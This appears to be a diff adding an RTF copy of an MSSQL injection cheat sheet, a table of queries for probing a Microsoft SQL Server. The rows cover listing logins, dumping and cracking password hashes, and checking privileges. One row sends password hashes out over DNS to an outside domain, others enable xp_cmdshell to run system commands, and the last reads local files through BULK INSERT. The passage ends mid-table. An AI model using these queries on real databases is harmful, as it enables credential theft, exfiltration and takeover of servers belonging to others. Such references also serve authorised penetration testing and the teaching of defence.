@@ -1,0 +1,328 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
+{\fonttbl\f0\fswiss\fcharset0 ArialMT;}
+{\colortbl;\red255\green255\blue255;\red59\green65\blue68;\red225\green225\blue225;\red17\green135\blue173;
+}
+\paperw11900\paperh16840\margl1440\margr1440\vieww17280\viewh10460\viewkind0
+\deftab720
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrt\brdrnil \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+
+\f0\fs26 \cf2 \expnd0\expndtw0\kerning0
+Version\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT @@version\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Comments\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT 1 \'97 comment\
+SELECT /*comment*/1\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Current User\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT user_name();\
+SELECT system_user;\
+SELECT user;\
+SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Users\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT name FROM master..syslogins\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Password Hashes\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT name, password FROM master..sysxlogins \'97 priv, mssql 2000;\
+SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins \'97 priv, mssql 2000.\'a0 Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.\
+SELECT name, password_hash FROM master.sys.sql_logins \'97 priv, mssql 2005;\
+SELECT name + \'91-\'92 + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins \'97 priv, mssql 2005\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \'a0Password Cracker\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 MSSQL 2000 and 2005 Hashes are both SHA1-based.\'a0 {\field{\*\fldinst{HYPERLINK "https://labs.portcullis.co.uk/application/phrasen-drescher/"}}{\fldrslt \cf4 phrasen|drescher}} can crack these.\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Privileges\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \'96 current privs on a particular object in 2005, 2008\
+SELECT permission_name FROM master..fn_my_permissions(null, \'91DATABASE\'92); \'97 current database\
+SELECT permission_name FROM master..fn_my_permissions(null, \'91SERVER\'92); \'97 current server\
+SELECT permission_name FROM master..fn_my_permissions(\'91master..syslogins\'92, \'91OBJECT\'92); \'96permissions on a table\
+SELECT permission_name FROM master..fn_my_permissions(\'91sa\'92, \'91USER\'92);\
+\
+\'96permissions on a user\'96 current privs in 2005, 2008\
+SELECT is_srvrolemember(\'91sysadmin\'92);\
+SELECT is_srvrolemember(\'91dbcreator\'92);\
+SELECT is_srvrolemember(\'91bulkadmin\'92);\
+SELECT is_srvrolemember(\'91diskadmin\'92);\
+SELECT is_srvrolemember(\'91processadmin\'92);\
+SELECT is_srvrolemember(\'91serveradmin\'92);\
+SELECT is_srvrolemember(\'91setupadmin\'92);\
+SELECT is_srvrolemember(\'91securityadmin\'92);\
+\'96 who has a particular priv? 2005, 2008\
+SELECT name FROM master..syslogins WHERE denylogin = 0;\
+SELECT name FROM master..syslogins WHERE hasaccess = 1;\
+SELECT name FROM master..syslogins WHERE isntname = 0;\
+SELECT name FROM master..syslogins WHERE isntgroup = 0;\
+SELECT name FROM master..syslogins WHERE sysadmin = 1;\
+SELECT name FROM master..syslogins WHERE securityadmin = 1;\
+SELECT name FROM master..syslogins WHERE serveradmin = 1;\
+SELECT name FROM master..syslogins WHERE setupadmin = 1;\
+SELECT name FROM master..syslogins WHERE processadmin = 1;\
+SELECT name FROM master..syslogins WHERE diskadmin = 1;\
+SELECT name FROM master..syslogins WHERE dbcreator = 1;\
+SELECT name FROM master..syslogins WHERE bulkadmin = 1;\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List DBA Accounts\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT is_srvrolemember(\'91sysadmin\'92); \'97 is your account a sysadmin?\'a0 returns 1 for true, 0 for false, NULL for invalid role.\'a0 Also try \'91bulkadmin\'92, \'91systemadmin\'92 and other values from the {\field{\*\fldinst{HYPERLINK "http://msdn.microsoft.com/en-us/library/ms176015.aspx"}}{\fldrslt \cf4 documentation\
+}}SELECT is_srvrolemember(\'91sysadmin\'92, \'91sa\'92); \'97 is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.\
+SELECT name FROM\'a0master..syslogins WHERE sysadmin = \'921\uc0\u8242  \'97 tested on 2005\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Current Database\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT DB_NAME()\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Databases\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT name FROM master..sysdatabases;\
+SELECT DB_NAME(N); \'97 for N = 0, 1, 2, \'85\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Columns\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = \'91mytable\'92); \'97 for the current DB only\
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=\'92sometable\'92; \'97 list colum names and types for master..sometable\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Tables\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT name FROM master..sysobjects WHERE xtype = \'91U\'92; \'97 use xtype = \'91V\'92 for views\
+SELECT name FROM someotherdb..sysobjects WHERE xtype = \'91U\'92;\
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=\'92sometable\'92; \'97 list colum names and types for master..sometable\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Find Tables From Column Name\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \'96 NB: This example works only for the current database.\'a0 If you wan\'92t to search another db, you need to specify the db name (e.g. replace sysobject with mydb..sysobjects).\
+SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = \'91U\'92 AND syscolumns.name LIKE \'91%PASSWORD%\'92 \'97 this lists table, column for each column containing the word \'91password\'92\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Select Nth Row\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC \'97 gets 9th row\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Select Nth Char\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT substring(\'91abcd\'92, 3, 1) \'97 returns c\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Bitwise AND\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT 6 & 2 \'97 returns 2\
+SELECT 6 & 1 \'97 returns 0\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 ASCII Value -> Char\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT char(0\'d741) \'97 returns A\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Char -> ASCII Value\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT ascii(\'91A\'92) \'96 returns 65\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Casting\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT CAST(\'921\uc0\u8242  as int);\
+SELECT CAST(1 as char)\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 String Concatenation\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT \'91A\'92 + \'91B\'92 \'96 returns AB\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 If Statement\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 IF (1=1) SELECT 1 ELSE SELECT 2 \'97 returns 1\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Case Statement\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END \'97 returns 1\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Avoiding Quotes\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT char(65)+char(66) \'97 returns AB\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Time Delay\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \'a0WAITFOR DELAY \'920:0:5\uc0\u8242  \'97 pause for 5 seconds\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Make DNS Requests\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 declare @host varchar(800); select @host = name FROM master..syslogins; exec(\'91master..xp_getfiledetails \'94\\\'92 + @host + \'91c$boot.ini\'94\'92); \'97 nonpriv, works on 2000declare @host varchar(800); select @host = name + \'91-\'92 + master.sys.fn_varbintohexstr(password_hash) + \'91.2.pentestmonkey.net\'92 from sys.sql_logins; exec(\'91xp_fileexist \'94\\\'92 + @host + \'91c$boot.ini\'94\'92); \'97 priv, works on 2005\'96 NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.\'a0 Messy but necessary.\
+\'96 Also check out theDNS tunnel feature of {\field{\*\fldinst{HYPERLINK "http://sqlninja.sourceforge.net/sqlninja-howto.html"}}{\fldrslt \cf4 sqlninja}}\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Command Execution\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 EXEC xp_cmdshell \'91net user\'92; \'97 privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it\'92s disabled by default:\
+EXEC sp_configure \'91show advanced options\'92, 1; \'97 priv\
+RECONFIGURE; \'97 priv\
+EXEC sp_configure \'91xp_cmdshell\'92, 1; \'97 priv\
+RECONFIGURE; \'97 priv\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Local File Access\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 CREATE TABLE mydata (line varchar(8000));\
+BULK INSERT mydata FROM \'91c:boot.ini\'92;\
